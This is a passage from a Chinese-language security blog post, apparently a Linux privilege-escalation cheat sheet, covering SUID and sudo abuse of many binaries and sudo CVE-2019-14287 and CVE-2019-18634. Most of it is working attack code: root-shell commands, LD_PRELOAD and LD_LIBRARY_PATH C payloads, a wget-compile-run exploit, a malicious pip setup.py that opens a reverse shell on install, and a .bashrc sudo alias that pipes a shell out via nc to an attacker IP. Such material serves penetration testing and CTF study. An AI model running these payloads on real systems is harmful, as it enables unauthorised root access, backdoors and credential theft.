+<h4 id="第二种有绝对路径的service"><a href="#第二种有绝对路径的service" class="headerlink" title="第二种有绝对路径的service"></a>第二种有绝对路径的service</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function &#x2F;usr&#x2F;sbin&#x2F;service() &#123; cp &#x2F;bin&#x2F;bash &#x2F;tmp &amp;&amp; chmod +s &#x2F;tmp&#x2F;bash &amp;&amp; &#x2F;tmp&#x2F;bash -p; &#125;</span><br><span class="line">export -f &#x2F;usr&#x2F;sbin&#x2F;service</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;suid-env2</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env -i SHELLOPTS&#x3D;xtrace PS4&#x3D;&#39;$(cp &#x2F;bin&#x2F;bash &#x2F;tmp &amp;&amp; chown root.root &#x2F;tmp&#x2F;bash &amp;&amp; chmod +s &#x2F;tmp&#x2F;bash)&#39; &#x2F;bin&#x2F;sh -c &#39;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;suid-env2; set +x; &#x2F;tmp&#x2F;bash -p&#39;</span><br></pre></td></tr></table></figure>
+
+<h3 id="suid-taskset"><a href="#suid-taskset" class="headerlink" title="suid taskset"></a>suid taskset</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">taskset 1 &#x2F;bin&#x2F;sh -p</span><br></pre></td></tr></table></figure>
+
+<h3 id="suid-cp"><a href="#suid-cp" class="headerlink" title="suid cp"></a>suid cp</h3><p>如果遇到suid位的cp，则可以利用/etc/passwd创建一个等同与root用户的账号。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd &gt;&gt; &#x2F;tmp&#x2F;passwd   ##此时的&#x2F;tmp&#x2F;passwd权限位当前用户应该是可写的</span><br><span class="line">openssl passwd -1 -salt abc 123</span><br><span class="line">echo &#39;abc:$1$abc$98&#x2F;EDagBiz63dxD3fhRFk1:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;tmp&#x2F;passwd</span><br><span class="line">cp &#x2F;tmp&#x2F;passwd &#x2F;etc&#x2F;passwd</span><br><span class="line">su abc</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="sudo-提权"><a href="#sudo-提权" class="headerlink" title="sudo 提权"></a>sudo 提权</h2><p><code>sudo -l</code><br>这个命令可以列出当前用户可以使用超级用户的什么命令。<br>如果目标可以执行sudo vi的话。<br>可以再打开vim之后 使用:!sh 来打开一个shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@123~]# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p>或者不打开vim，直接使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim -c &#39;!sh&#39;</span><br></pre></td></tr></table></figure>
+
+<h3 id="sudo-nmap"><a href="#sudo-nmap" class="headerlink" title="sudo nmap"></a>sudo nmap</h3><h4 id="nmap-2-02-5-21"><a href="#nmap-2-02-5-21" class="headerlink" title="nmap 2.02 - 5.21"></a>nmap 2.02 - 5.21</h4><p>可以打开交互界面提权。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --interactive</span><br><span class="line">nmap&gt;!sh</span><br></pre></td></tr></table></figure>
+
+<h4 id="nmap-脚本提权"><a href="#nmap-脚本提权" class="headerlink" title="nmap 脚本提权"></a>nmap 脚本提权</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp)</span><br><span class="line">echo 'os.execute("/bin/sh")' &gt; $TF</span><br><span class="line">sudo nmap --script=$TF</span><br></pre></td></tr></table></figure>
+<p>等价于</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo "os.execute('/bin/sh')" &gt; shell.nse &amp;&amp; sudo nmap --script=shell.nse</span><br></pre></td></tr></table></figure>
+<h3 id="sudo-apache2"><a href="#sudo-apache2" class="headerlink" title="sudo apache2"></a>sudo apache2</h3><h4 id="动态连接共享库提权"><a href="#动态连接共享库提权" class="headerlink" title="动态连接共享库提权"></a>动态连接共享库提权</h4><p>这个是利用动态链接共享对象库提权</p>
+<a href="https://cloud.tencent.com/developer/article/1038337" title="" target="">动态链接共享对象库提权</a>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -nostartfiles -o &#x2F;tmp&#x2F;preload.so &#x2F;home&#x2F;user&#x2F;tools&#x2F;sudo&#x2F;preload.c</span><br><span class="line">sudo LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;preload.so program-name-here</span><br></pre></td></tr></table></figure>
+<p>此时应该也会生成一个root_shell了</p>
+<figure class="highlight c"><figcaption><span>preload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> _init() &#123;</span><br><span class="line">        unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">        setresuid(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        system(<span class="string">"/bin/bash -p"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -o &#x2F;tmp&#x2F;libcrypt.so.1 -shared -fPIC &#x2F;home&#x2F;user&#x2F;tools&#x2F;sudo&#x2F;library_path.c</span><br><span class="line">sudo LD_LIBRARY_PATH&#x3D;&#x2F;tmp apache2</span><br></pre></td></tr></table></figure>
+<p>此时应该也会生成一个root_shell了。</p>
+<figure class="highlight c"><figcaption><span>library_path.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hijack</span><span class="params">()</span> __<span class="title">attribute__</span><span class="params">((constructor))</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hijack</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        unsetenv(<span class="string">"LD_LIBRARY_PATH"</span>);</span><br><span class="line">        setresuid(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        system(<span class="string">"/bin/bash -p"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="滥用预期功能"><a href="#滥用预期功能" class="headerlink" title="滥用预期功能"></a>滥用预期功能</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apache2 -f &#x2F;etc&#x2F;shadow</span><br></pre></td></tr></table></figure>
+<p>爆破就完事了…</p>
+<h3 id="sudo-find"><a href="#sudo-find" class="headerlink" title="sudo find"></a>sudo find</h3><p>find 命令有一个参数可以执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo find &#x2F;bin -name nano -exec &#x2F;bin&#x2F;sh \;</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="sudo-awk"><a href="#sudo-awk" class="headerlink" title="sudo awk"></a>sudo awk</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;sh&quot;)&#125;&#39;</span><br></pre></td></tr></table></figure>
+<h3 id="sudo-zip"><a href="#sudo-zip" class="headerlink" title="sudo zip"></a>sudo zip</h3><p>要求sudo配置如下</p>
+<ul>
+<li><code>&lt;user&gt; ALL=(ALL) NOPASSWD: /usr/bin/zip</code>(不是一定要这样,只要能sudo执行zip就可以了)</li>
+</ul>
+<p>可以这样利用:</p>
+<figure class="highlight shell"><figcaption><span>GTFOBins-zip</span><a href="https://gtfobins.github.io/gtfobins/zip/" target="_blank" rel="noopener">link</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp -u)</span><br><span class="line">sudo zip $TF /etc/hosts -T -TT 'sh #'</span><br><span class="line">sudo rm $TF</span><br></pre></td></tr></table></figure>
+
+<p>也可以:</p>
+<figure class="highlight shell"><figcaption><span>类Unix系统上使用zip命令进行本地提权</span><a href="https://www.freebuf.com/articles/system/206007.html" target="_blank" rel="noopener">link</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch raj.txt</span><br><span class="line">zip 1.zip raj.txt -T --unzip-command="sh -c sh"</span><br></pre></td></tr></table></figure>
+
+<p>不过有可能会有些机器不支持<code>unzip-command</code>模块，会报这样的错误。</p>
+<blockquote><p>$ sudo -u jsmith zip 1.zip 1.txt -T –unzip-conmmand=’sh -c sh’</p>
+<p>zip error: Invalid command arguments (long option ‘unzip-conmmand’ not supported)</p>
+</blockquote>
+
+<h3 id="sudo-tar"><a href="#sudo-tar" class="headerlink" title="sudo tar"></a>sudo tar</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tar -cf &#x2F;dev&#x2F;null &#x2F;dev&#x2F;null --checkpoint&#x3D;1 --checkpoint-action&#x3D;exec&#x3D;&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>
+
+<h3 id="sudo-vi-vim"><a href="#sudo-vi-vim" class="headerlink" title="sudo vi/vim"></a>sudo vi/vim</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim -c &#39;:!&#x2F;bin&#x2F;bash&#39;</span><br></pre></td></tr></table></figure>
+
+<h3 id="sudo-java"><a href="#sudo-java" class="headerlink" title="sudo java"></a>sudo java</h3><p>先msfvenom生成一个jar的木马上传到目标机器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo java -jar your_muma_name.jar</span><br></pre></td></tr></table></figure>
+
+<h3 id="sudo-man"><a href="#sudo-man" class="headerlink" title="sudo man"></a>sudo man</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo man man</span><br><span class="line">!&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+
+<h3 id="sudo-yum"><a href="#sudo-yum" class="headerlink" title="sudo yum"></a>sudo yum</h3><p>没有fpm环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp -d)</span><br><span class="line">cat &gt;<span class="variable">$TF</span>/x&lt;&lt;EOF</span><br><span class="line">[main]</span><br><span class="line">plugins=1</span><br><span class="line">pluginpath=<span class="variable">$TF</span></span><br><span class="line">pluginconfpath=<span class="variable">$TF</span></span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">cat &gt;<span class="variable">$TF</span>/y.conf&lt;&lt;EOF</span><br><span class="line">[main]</span><br><span class="line">enabled=1</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">cat &gt;<span class="variable">$TF</span>/y.py&lt;&lt;EOF</span><br><span class="line">import os</span><br><span class="line">import yum</span><br><span class="line">from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE</span><br><span class="line">requires_api_version=<span class="string">'2.1'</span></span><br><span class="line">def init_hook(conduit):</span><br><span class="line">os.execl(<span class="string">'/bin/sh'</span>,<span class="string">'/bin/sh'</span>)</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">sudo yum -c <span class="variable">$TF</span>/x --enableplugin=y</span><br></pre></td></tr></table></figure>
+
+<p>有fpm环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp -d)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'id'</span> &gt; <span class="variable">$TF</span>/x.sh</span><br><span class="line">fpm -n x -s dir -t rpm -a all --before-install <span class="variable">$TF</span>/x.sh <span class="variable">$TF</span></span><br><span class="line"></span><br><span class="line">sudo yum localinstall -y x-1.0-1.noarch.rpm</span><br></pre></td></tr></table></figure>
+
+<h3 id="sudo-pkexec"><a href="#sudo-pkexec" class="headerlink" title="sudo pkexec"></a>sudo pkexec</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pkexec --user root &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+
+<h3 id="sudo-systemctl"><a href="#sudo-systemctl" class="headerlink" title="sudo systemctl"></a>sudo systemctl</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl</span><br><span class="line">!sh</span><br></pre></td></tr></table></figure>
+
+<p>创建一个服务的方式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TF&#x3D;$(mktemp).service</span><br><span class="line">echo &#39;[Service]</span><br><span class="line">Type&#x3D;oneshot</span><br><span class="line">ExecStart&#x3D;&#x2F;bin&#x2F;sh -c &quot;id &gt; &#x2F;tmp&#x2F;output&quot;</span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target&#39; &gt; $TF</span><br><span class="line">sudo systemctl link $TF</span><br><span class="line">sudo systemctl enable --now $TF</span><br></pre></td></tr></table></figure>
+
+<h3 id="sudo-journalctl"><a href="#sudo-journalctl" class="headerlink" title="sudo journalctl"></a>sudo journalctl</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo journalctl</span><br><span class="line">!&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+
+<h3 id="sudo-strace"><a href="#sudo-strace" class="headerlink" title="sudo strace"></a>sudo strace</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo strace -o &#x2F;dev&#x2F;null &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>
+
+<h3 id="sudo-taskset"><a href="#sudo-taskset" class="headerlink" title="sudo taskset"></a>sudo taskset</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo taskset 1 &#x2F;bin&#x2F;sh -p</span><br></pre></td></tr></table></figure>
+
+<h3 id="sudo-pip-pip3"><a href="#sudo-pip-pip3" class="headerlink" title="sudo pip/pip3"></a>sudo pip/pip3</h3><h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp -d)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;<span class="variable">$(tty)</span> &gt;<span class="variable">$(tty)</span> 2&gt;<span class="variable">$(tty)</span>')"</span> &gt; <span class="variable">$TF</span>/setup.py</span><br><span class="line">sudo pip3 install <span class="variable">$TF</span></span><br></pre></td></tr></table></figure>
+
+<p>如果直接利用不行，那就是试试先打开一个python pty，再尝试利用。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">'import pty;pty.spawn("/bin/bash")'</span></span><br><span class="line"></span><br><span class="line">TF=$(mktemp -d)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;<span class="variable">$(tty)</span> &gt;<span class="variable">$(tty)</span> 2&gt;<span class="variable">$(tty)</span>')"</span> &gt; <span class="variable">$TF</span>/setup.py</span><br><span class="line">sudo pip3 install <span class="variable">$TF</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>安装恶意setup.py脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from setuptools import setup</span><br><span class="line">from setuptools.command.install import install</span><br><span class="line">import os, socket, subprocess</span><br><span class="line"></span><br><span class="line">class CustomInstall(install):</span><br><span class="line">  def run(self):</span><br><span class="line">    install.run(self)</span><br><span class="line">    s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    s.connect((&quot;127.0.0.1&quot;,1234))</span><br><span class="line">    os.dup2(s.fileno(),0)</span><br><span class="line">    os.dup2(s.fileno(),1)</span><br><span class="line">    os.dup2(s.fileno(),2)</span><br><span class="line">    p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;])</span><br><span class="line"></span><br><span class="line">setup(name&#x3D;&#39;FakePip&#39;,</span><br><span class="line">      version&#x3D;&#39;0.0.1&#39;,</span><br><span class="line">      description&#x3D;&#39;Reverse shell&#39;,</span><br><span class="line">      url&#x3D;&#39;xx.xx.xx.xx&#39;,</span><br><span class="line">      author&#x3D;&#39;nathan&#39;,</span><br><span class="line">      author_email&#x3D;&#39;xx@xx&#39;,</span><br><span class="line">      license&#x3D;&#39;MIT&#39;,</span><br><span class="line">      zip_safe&#x3D;False,</span><br><span class="line">      cmdclass&#x3D;&#123;&#39;install&#39;: CustomInstall&#125;)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 install . --upgrade --force-reinstall</span><br></pre></td></tr></table></figure>
+
+<h3 id="sudo-CVE-2019-14287-提权"><a href="#sudo-CVE-2019-14287-提权" class="headerlink" title="sudo CVE-2019-14287 提权"></a>sudo CVE-2019-14287 提权</h3><p>要求</p>
+<ul>
+<li>sudo版本低于v1.8.28</li>
+<li>/etc/sudoers 配置要求如下(要求一组特定权限)<ul>
+<li><code>&lt;user&gt; ALL=(ALL:!root) NOPASSWD: ALL</code></li>
+</ul>
+</li>
+</ul>
+<p><code>&lt;user&gt; ALL=(ALL:!root) NOPASSWD: ALL</code>代表该用户能以<strong>非root</strong>的身份运行所有命令</p>
+<p>注意:<strong>root的uid永远为0</strong></p>
+<p>使用这个漏洞之前,我们需要知道sudo的一个参数<code>-u</code></p>
+<p><code>sudo -u#0 &lt;command&gt;</code></p>
+<p>即以uid为0的用户去运行这个命令.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -u#0 whoami</span><br><span class="line">[sudo] password for abc:</span><br><span class="line">root</span><br><span class="line"></span><br><span class="line">$ sudo -u#1 whoami</span><br><span class="line">bin</span><br></pre></td></tr></table></figure>
+
+<p>那么如果我们输入一个uid位为无符号的整型的时候会怎么样呢??</p>
+<p><code>sudo -u#-1 whoami</code></p>
+<details>
+<summary>答案</summary>
+<pre><code>
+
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200511_110433.jpg" alt="sd"><br>如果目标机器的sudo版本以及拥有特定权限都满足以上条件,那么你就能获得root权限.</p>
+<p>Sudo会错误地将<code>-1</code>或者<code>4294967295</code>读取为0（即root）。 这意味着通过将UID指定为<code>-1</code>或<code>4294967295</code>，就能以root身份执行命令</p>
+<p>再次提醒:您需要sudo版本以及拥有非root sudo权限的情况下,才能起作用.否则毫无价值.<br></code></pre></p>
+</details>
+
+<h3 id="sudo-CVE-2019-18634-提权"><a href="#sudo-CVE-2019-18634-提权" class="headerlink" title="sudo CVE-2019-18634 提权"></a>sudo CVE-2019-18634 提权</h3><p>sudo版本要求</p>
+<ul>
+<li>sudo版本低于1.8.26</li>
+<li>sudo配置开启<code>pwfeedback</code></li>
+</ul>
+<p>这与<code>CVE-2019-14287</code>的不同之处在于,<code>CVE-2019-14287</code>要求特定的权限,而<code>CVE-2019-18634</code>不需要任何特定的权限,即使是未在sudoers文件中列出的用户也可利用此漏洞。</p>
+<p><code>CVE-2019-18634</code> 使用到了缓冲区溢出攻击(Buffer Overflow)</p>
+<p><code>pwfeedback</code>选项是可让用户在输入密码时提供可视化的反馈（辅助输入）。</p>
+<p><code>pwfeedback</code> 在Linux Mint和 elementary OS 默认开启,但在其他系统就不是了.需要管理员开启才能生效</p>
+<blockquote>
+<p>Sudo的开发者Todd C. Miller表示，利用此漏洞和sudo权限无关，只需要启用了pwfeedback即可。</p>
+</blockquote>
+<p>当sudo提示输入密码时，可以通过管道符将大量输入传递给sudo，从而重现漏洞，例如:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ perl -e &#39;print((&quot;A&quot; x 100 . &quot;\x&#123;00&#125;&quot;) x 50)&#39; | sudo -S id</span><br><span class="line">Password: Segmentation fault</span><br></pre></td></tr></table></figure>
+<p>在这个命令中，我们使用Perl生成大量无用字符，然后使用管道符将这些字符作为密码传递给sudo命令。</p>
+<p>但是这实际上并没有给我们root权限，相反，它向我们显示了一个错误消息:Segmentation fault，这基本上意味着我们试图访问一些我们不应该访问的内存。这证明了缓冲区溢出漏洞的存在:现在我们只需要利用它</p>
+<p>exp作者:<a href="https://github.com/saleemrashid/sudo-cve-2019-18634" target="_blank" rel="noopener">saleemrashid</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;saleemrashid&#x2F;sudo-cve-2019-18634&#x2F;master&#x2F;exploit.c</span><br><span class="line"></span><br><span class="line">gcc -o exploit exploit.c</span><br><span class="line"></span><br><span class="line">.&#x2F;exploit</span><br></pre></td></tr></table></figure>
+<p><img src="https://images.atsud0.me/images/post/CVE-2019-18634-Demo-1.png" alt="cve-2019-18634"></p>
+<p>漏洞出现的原因有两个：</p>
+<ul>
+<li><p>当从终端设备以外的设备读取数据时，pwfeedback选项不会被忽略。由于缺少终端，已保存的行擦除字符的版本保持其初始值0。</p>
+</li>
+<li><p>如果出现写错误，擦除星号行的代码就无法正确地重置缓冲区位置，但是会重置剩余的缓冲区长度。因此，getln()函数可以写入缓冲区的末尾。</p>
+</li>
+</ul>
+<h3 id="sudo-LD-PRELOAD环境变量提权"><a href="#sudo-LD-PRELOAD环境变量提权" class="headerlink" title="sudo LD_PRELOAD环境变量提权"></a>sudo LD_PRELOAD环境变量提权</h3><blockquote>
+<p>Linux操作系统的动态链接库在加载过程中，动态链接器会先读取LD_PRELOAD环境变量和默认配置文件/etc/ld.so.preload，并将读取到的动态链接库文件进行预加载，即使程序不依赖这些动态链接库，LD_PRELOAD环境变量和/etc/ld.so.preload配置文件中指定的动态链接库依然会被装载,因为它们的优先级比LD_LIBRARY_PATH环境变量所定义的链接库查找路径的文件优先级要高，所以能够提前于用户调用的动态库载入。<br><a href="https://payloads.online/archivers/2020-01-01/1" target="_blank" rel="noopener">Linux权限维持之LD_PRELOAD</a></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void _init() &#123;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    setgid(0);</span><br><span class="line">    setuid(0);</span><br><span class="line">    system(&quot;&#x2F;bin&#x2F;bash&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -o &#x2F;tmp&#x2F;x.so x.c -nostartfiles</span><br><span class="line">sudo LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;x.so apache2</span><br></pre></td></tr></table></figure>
+
+<h3 id="记一个比较秀的sudo提权"><a href="#记一个比较秀的sudo提权" class="headerlink" title="记一个比较秀的sudo提权"></a>记一个比较秀的sudo提权</h3><p><a href="https://redd.it/hn6vy5" target="_blank" rel="noopener">Why does .bashrc have write access by non-root users by default?</a></p>
+<blockquote>
+<p>Why does .bashrc have write access by non-root users by default?<br>I am not really sure if there is any non-malicious use cases where ~/.bashrc needs to be writable without root. Anyone with write access to .bashrc can make an alias like<br>    alias sudo=’sudo BAD_COMMAND; sudo’<br>Wouldn’t it make more sense to make bashrc harder to write to?</p>
+</blockquote>
+<p>如果你拿到了一个非root,但是又拥有sudo权限的用户的shell.而你不知道该用户的密码,可以这样提权.</p>
+<p>修改该用户的shell的配置文件,添加一个别名sudo</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias sudo &#x3D;&#39;sudo nc -nv IP PORT 2&gt;&#x2F;dev&#x2F;null &amp;;sudo&#39;</span><br></pre></td></tr></table></figure>
+<p>监听端口,等待用户上线后sudo命令输入密码获得shell.<br><img src="https://images.atsud0.me/images/post/Screenshot_20200708_151735.jpg" alt=""></p>
+<h2 id="Capabilities"><a href="#Capabilities" class="headerlink" title="Capabilities"></a>Capabilities</h2><p><a href="https://cloud.tencent.com/developer/article/1529342" target="_blank" rel="noopener">Capabilities</a></p>
+<blockquote>
